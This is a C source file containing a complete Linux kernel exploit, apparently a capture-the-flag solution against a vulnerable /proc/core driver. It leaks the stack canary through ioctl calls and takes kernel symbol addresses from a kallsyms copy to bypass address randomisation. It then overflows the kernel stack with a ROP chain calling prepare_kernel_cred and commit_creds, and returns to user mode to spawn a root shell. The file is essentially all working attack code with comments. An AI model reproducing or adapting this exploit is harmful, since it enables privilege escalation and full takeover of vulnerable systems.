#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>

size_t user_cs, user_ss, user_rflags, user_sp;
size_t canary;
char buf[0x100];
size_t commit_creds = 0;
size_t prepare_kernel_cred = 0;
size_t vmlinux_base = 0;        //加载后的vmlinux基址
size_t raw_vmlinux_base = 0xffffffff81000000;   //未加载时的vmlinux基址

//intel 保存用户态
void save_status(){
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
               );
        puts("[*] saved !");
}

//leak canary
void core_read(int fd, char *user_buf){
        ioctl(fd, 0x6677889B, user_buf);
}

//set off
void set_off(int fd, long long len){
        ioctl(fd, 0x6677889C, len);
}

//stack overflow
void core_copy_func(int fd, long long len){
        ioctl(fd, 0x6677889A, len);
}

//起一个root shell
void get_root_shell(){
        if(!getuid()){
                puts("[+] root! pwned by whiter");
                system("/bin/sh");
        }else{
                puts("[-] false ");
        }
        exit(0);
}
void leak_canary(){
    set_off(3,0x40);
    core_read(3,buf);
    canary = *(size_t *)buf;
    printf("[+] canary = %p\n",canary);
}

size_t get_vmlinux_base(){
        FILE* fd = fopen("/tmp/kallsyms","r");

        if(fd < 0)
                exit(0);

        char buf[0x30] = {0};
        while(fgets(buf, 0x30, fd)){

                if(commit_creds & prepare_kernel_cred)
                        return 0;
                if(strstr(buf, "commit_creds") && !commit_creds){
                        char hex[20] = {0};
                        strncpy(hex, buf, 16);//只拷贝前16字节
                        sscanf(hex,"%llx", &commit_creds);
                        printf("[+] commit_creds = %p\n", commit_creds);
                        vmlinux_base = commit_creds-0x9c8e0;
                        printf("[+] vmlinux_base = %p\n", vmlinux_base);
                }

                if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred){
                        char hex[20] = {0};
                        strncpy(hex, buf, 16);
                        sscanf(hex, "%llx", &prepare_kernel_cred);
                        printf("[+] prepare_kernel_cred = %p\n", prepare_kernel_cred);
                        vmlinux_base = prepare_kernel_cred - 0x9cce0;
                        printf("[+] vmlinux_base = %p\n", vmlinux_base);
                }
        }

        if(! (prepare_kernel_cred & commit_creds)){
                puts("error !");
                exit(0);
        }
}
void attack(){
        size_t offset = vmlinux_base - raw_vmlinux_base;
        size_t rop[0x1000] = {0};
        int i=0;
        for(;i < 10;i++){
                rop[i] = canary;
        }
                rop[i++] = 0xffffffff81000b2f + offset; //pop rdi ; ret
        rop[i++] = 0;
        rop[i++] = prepare_kernel_cred;
        rop[i++] = 0xffffffff810a0f49 + offset; //pop rdx; ret
        rop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret
        rop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx; 
        rop[i++] = commit_creds;
        rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret
        rop[i++] = 0;
        rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; 
        rop[i++] = (size_t)get_root_shell;
        rop[i++] = user_cs;
        rop[i++] = user_rflags;
        rop[i++] = user_sp;
        rop[i++] = user_ss;

        write(3, rop, 0x800);
        core_copy_func(3, 0xffffffffffff0000 | (0x100));

}
void main(){
        save_status();
        int fd = open("/proc/core",2);
    leak_canary();
    get_vmlinux_base();
    attack();
}